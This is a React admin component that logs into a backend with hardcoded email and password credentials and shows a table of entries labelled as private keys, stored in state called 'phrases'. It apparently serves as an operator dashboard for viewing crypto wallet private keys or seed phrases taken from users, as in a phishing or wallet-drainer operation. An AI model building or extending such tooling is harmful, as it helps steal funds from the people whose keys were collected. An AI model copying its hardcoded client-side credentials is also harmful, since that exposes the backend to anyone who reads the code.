import React, { useEffect, useState } from 'react';
import axios from 'axios';
import { Table, Thead, Tbody, Tr, Th, Td, TableContainer, Spinner, Alert, AlertIcon, Box } from '@chakra-ui/react';

function Privatekey() {
  const [phrases, setPhrases] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [email, setEmail] = useState("charles@gmail.com")
  const [password, setPassword] = useState("12345678")

  useEffect(() => {
    const fetchPhrases = async () => {
      try {

         // first post request
    const loginResponse = await axios.post("https://backend.accosmart.com.ng/api/auth/login", {email,password})
    // get token from response
    const token = loginResponse.data.token; 

        const response = await axios.get('https://backend.accosmart.com.ng/api/admin/private', {
          headers: {
           Authorization: `Bearer ${token}`, 
                "Content-Type": "application/json",
          },
        });
        console.log(response?.data)
        setPhrases(response?.data); // Assuming the response data is an array of phrases
      } catch (err) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    };

    fetchPhrases();
  }, []);

  if (loading) {
    return (
      <Box display="flex" justifyContent="center" mt="50px">
        <Spinner size="xl" />
      </Box>
    );
  }

  if (error) {
    return (
      <Box display="flex" justifyContent="center" mt="50px">
        <Alert status="error" borderRadius="md" w="50%">
          <AlertIcon />
          Error: {error}
        </Alert>
      </Box>
    );
  }

  return (
    <TableContainer>
      <Table variant="simple" mt={4}>
        <Thead>
          <Tr>
            <Th>PrivateKey ID</Th>
            <Th>Privatekey</Th>
            
          </Tr>
        </Thead>
        <Tbody>
          {phrases.map((phrase, index) => (
            <Tr key={index}>
              <Td>{phrase?.id}</Td>
              <Td>{phrase?.privatetext}</Td>
            </Tr>
          ))}
        </Tbody>
      </Table>
    </TableContainer>
  );
}

export default Privatekey;